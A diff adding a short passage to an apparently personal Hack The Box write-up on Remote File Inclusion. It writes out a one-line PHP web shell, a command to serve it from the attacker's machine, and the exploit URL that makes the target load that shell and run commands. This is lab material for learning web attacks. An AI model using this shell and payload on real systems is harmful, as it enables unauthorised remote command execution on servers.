@@ -47,3 +47,4 @@ After going throught HTB Writeup we can see that <code>http://<SERVER_IP>:<PORT>
 
 <h1><ins>Remote File Inclusion (RFI)</ins></h1>
 <h2>Task: Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in/</h2>
+Flowoing HTB Writeup first we create a basic php shell <code>echo '<?php system($_GET["cmd"]); ?>' > shell.php</code> then we start a python server <code>sudo python3 -m http.server <LISTENING_PORT></code> back in the web page we can use this url <code>http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id</code> to pass commands. After going trough directories we can easelly find our flag.
